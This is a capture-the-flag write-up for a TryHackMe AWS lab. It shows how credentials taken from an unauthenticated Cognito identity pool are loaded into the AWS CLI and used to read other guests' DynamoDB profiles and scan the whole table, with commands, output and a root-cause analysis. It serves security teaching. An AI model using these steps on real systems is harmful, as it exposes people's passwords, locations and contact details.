# TryHackMe — Hacker Holidays 2026
## Day 3: [Complimentary](https://tryhackme.com/room/hh-complimentary-05e0b604)

**Platform:** [TryHackMe](https://tryhackme.com)  
**Category:** Cloud - AWS / Identity & Access Management  
**Difficulty:** Medium

---

## Description

The Byte Lotus Wellness app promises "complimentary access" with zero friction: no login required, no account creation, instant access. Behind the scenes, AWS Cognito Identity silently hands out temporary credentials to every user. The problem? Those credentials are identical and unrestricted. DynamoDB has no authorization layer to prevent one guest from reading another's data.

---

## Reconnaissance

### Understanding the Architecture

The app is served from an S3 static website. When you open it, several things happen automatically:

1. The browser loads the AWS SDK
2. AWS Cognito Identity is called to generate temporary credentials
3. Those credentials are used to query a DynamoDB table
4. **No login or authentication happens at any step**

This is a deliberate design choice for "frictionless" access, but it creates a critical vulnerability.

### Step 1 — Identify the Cognito Identity call

Open Browser DevTools (F12) and navigate to the **Network** tab. Look for requests to `cognito-identity.us-east-1.amazonaws.com`. You'll see a POST request with this target:

```
X-Amz-Target: AWSCognitoIdentityService.GetCredentialsForIdentity
```

**What this means:** Cognito is handing out AWS temporary credentials without verifying who you are.

### Step 2 — Identify the DynamoDB query

In the same Network tab, find the request to `dynamodb.us-east-1.amazonaws.com`. The request body will look like this:

```json
{"TableName":"complimentary-GuestWellnessProfiles","Key":{"guest_id":{"S":"guest-5nwtuue6"}}}
```

**What this means:** The app is querying DynamoDB using your `guest_id`. But there's nothing stopping you from changing this to read another guest's data.

---

## Exploitation

### Step 1 — Extract Cognito Credentials

In the Network tab, click on the Cognito response. The JSON response will contain:

```json
{
  "Credentials": {
    "AccessKeyId": "ASIAU2VYTBGYKCJW444W",
    "SecretKey": "8WDN6cAMM2hkX9cEMfUXKQ48MDb8hHzGZCDGbjXo",
    "SessionToken": "IQoJb3JpZ2luX2VjE...[very long token]..."
  },
  "IdentityId": "us-east-1:4d571309-b0e5-cc35-a407-80be3d7b83cc"
}
```

**Extract these three values:**
- `AccessKeyId` — identifies which credential set
- `SecretKey` — proves you own the credentials
- `SessionToken` — temporary proof of identity

### Step 2 — Configure AWS CLI with the Extracted Credentials

On your Kali machine, set up environment variables with the extracted credentials:

```bash
export AWS_ACCESS_KEY_ID="ASIAU2VYTBGYKCJW444W"
export AWS_SECRET_ACCESS_KEY="8WDN6cAMM2hkX9cEMfUXKQ48MDb8hHzGZCDGbjXo"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjE..." # paste the full token
export AWS_DEFAULT_REGION="us-east-1"
```

**What this does:** AWS CLI will now use these credentials for all requests. AWS will accept them because they're valid temporary credentials issued by Cognito.

### Step 3 — Query Your Own Record (Baseline)

First, confirm you can read your own guest profile:

```bash
aws dynamodb get-item \
  --table-name complimentary-GuestWellnessProfiles \
  --key '{"guest_id":{"S":"guest-5nwtuue6"}}'
```

**Output (your own profile):**

```json
{
  "Item": {
    "password": {"S": "[your_password]"},
    "location": {"S": "[your_coordinates]"},
    "notes": {"S": "[your_notes]"},
    "guest_id": {"S": "guest-5nwtuue6"},
    "email": {"S": "[your_email]"},
    "phone": {"S": "[your_phone]"},
    "name": {"S": "[your_name]"}
  }
}
```

**What happened:** You successfully queried DynamoDB using the temporary credentials. This is expected — but notice you never authenticated.

### Step 4 — Exploit: Read Lambo's Profile

DynamoDB has **no authorization checks**. Simply change the `guest_id` to read anyone's data:

```bash
aws dynamodb get-item \
  --table-name complimentary-GuestWellnessProfiles \
  --key '{"guest_id":{"S":"guest-lambo"}}'
```

**Output (Lambo's exposed profile):**

```json
{
  "Item": {
    "password": {"S": "sunkissed88"},
    "location": {"S": "25.2048,55.2708"},
    "notes": {"S": "Posted 47 times in three days. Wants everything tagged #ByteLotus for the algorithm."},
    "guest_id": {"S": "guest-lambo"},
    "email": {"S": "lambo@hackerholidays.thm"},
    "phone": {"S": "+1-555-0142"},
    "name": {"S": "Lambo (@0xMia)"}
  }
}
```

**What happened:** You just read another guest's complete profile — password, GPS coordinates, email, and phone — with zero authorization.

### Step 5 — Find the Flag

The flag is hidden somewhere in the DynamoDB table. Scan the entire table to find it:

```bash
aws dynamodb scan \
  --table-name complimentary-GuestWellnessProfiles | grep -i "thm{"
```

**Output:**

```
"S": "If you're reading this, the wellness app's guest role can read every profile, not just its own. THM{[REDACTED]}"
```

**What happened:** The flag was found embedded in a guest profile field as an intentional alert message.

---

## Command Flag Breakdown

### `export AWS_*=...`

These environment variables tell AWS CLI which credentials to use for every API call. AWS will verify these credentials are valid before executing your request.

### `aws dynamodb get-item`

- `--table-name` → which DynamoDB table to query
- `--key` → the primary key to look up (format: `{"AttributeName":{"DataType":"value"}}`)

### `aws dynamodb scan`

- Reads **all** items in a table (no primary key required)
- Returns every record, every attribute
- Useful for reconnaissance when you don't know which specific `guest_id` to target

### `grep -i "thm{"`

- `-i` → case-insensitive search
- Filters the output to only show lines containing the flag pattern

---

## Root Cause Analysis

This vulnerability exists because of three critical failures:

### 1. No Authentication
Cognito Identity issued credentials **without verifying the user's identity**. It should require login or at least a unique identifier per user.

### 2. Shared Credentials
All users received the **same credential set**. There's no way to distinguish which user is making a request. Proper design would issue unique credentials per authenticated user.

### 3. No Authorization in DynamoDB
DynamoDB had **no fine-grained access control (IAM policies)**. The role attached to these credentials had blanket `dynamodb:GetItem` and `dynamodb:Scan` permissions on the entire table. Proper design would restrict each user to read only their own `guest_id`.


---

## Result

Challenge solved through AWS credential extraction via browser DevTools and DynamoDB authorization bypass.

